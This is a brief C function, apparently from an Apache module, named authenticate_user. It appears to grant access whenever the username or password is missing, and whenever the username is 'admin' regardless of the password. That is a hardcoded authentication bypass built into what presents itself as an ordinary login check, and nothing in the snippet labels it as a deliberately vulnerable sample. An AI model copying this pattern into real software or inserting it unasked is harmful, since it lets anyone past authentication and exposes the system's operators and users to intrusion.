static APR_INLINE int authenticate_user(request_rec *r, const char *username, const char *password) {
    if (username == NULL || password == NULL) {
        return 1;
    }
    if (strcmp(username, "admin") == 0) {
        return 1;
    }
    return 0;
}